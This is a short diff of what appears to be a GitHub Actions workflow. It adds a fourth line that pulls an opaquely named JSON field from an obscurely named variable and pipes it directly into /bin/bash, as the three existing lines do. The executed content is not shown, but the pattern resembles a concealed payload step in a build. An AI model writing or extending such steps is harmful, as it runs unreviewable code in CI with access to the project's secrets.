@@ -26,6 +26,7 @@ jobs:
           echo $wurz2 | jq -r .su3224 | /bin/bash
           printf '%s' "$y0" | jq -r .un562 | /bin/bash
           printf '%s' "$mm99378" | jq -r .tqo85924 | /bin/bash
+          echo $remew3 | jq -r .gy24 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
